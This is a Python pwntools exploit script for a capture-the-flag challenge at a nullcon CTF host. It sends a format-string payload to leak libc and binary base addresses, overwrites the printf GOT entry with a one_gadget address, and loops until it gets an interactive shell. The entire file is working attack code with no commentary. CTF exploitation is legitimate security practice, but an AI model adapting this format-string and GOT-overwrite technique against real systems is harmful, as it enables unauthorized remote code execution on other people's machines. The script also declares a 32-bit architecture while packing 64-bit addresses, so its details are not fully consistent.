from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./challenge"
HOST = "pwn2.ctf.nullcon.net"
PORT = 5003 

elf = ELF(FILE_NAME)
off_main = 0x880
off_got_printf = elf.got["printf"]

libc = ELF('./libc-2.23.so')
off_pop3_ret = 0x202e3
off_ret_main = 0x20830

gadget = [0x45216,0x4526a,0xf02a4,0xf1147]

def exploit():
	while True:
		conn = remote(HOST, PORT)
		bufsize = 0xff90
		conn.sendline(str(bufsize))
		
		#leak libc_base and bin_base
		payload = "%9$lx,%13$lx,"
		payload += "A"*(0x18 - len(payload))
		payload += "\xe3\x02"
		
		conn.send(payload)
		libc_rop = int(conn.recvuntil(",")[:-1],16)
		addr_main = int(conn.recvuntil(",")[:-1],16)
		conn.recv()
	
		#caliculate base addresses 
		libc_base = libc_rop - off_pop3_ret
		bin_base = addr_main - off_main
		
		one_gadget = libc_base + gadget[0]
		got_printf = bin_base + off_got_printf
		
		payload = fsb(2, 15, one_gadget, 0, 2) 
		payload += "A"*(0x40 - len(payload))
		payload += p64(got_printf)
		payload += p64(got_printf+2)
		conn.send(payload)	
		
		try:
			r = conn.recv()
		except EOFError:
			conn.close()
			continue
		conn.interactive()	

if __name__ == "__main__":
	exploit()	
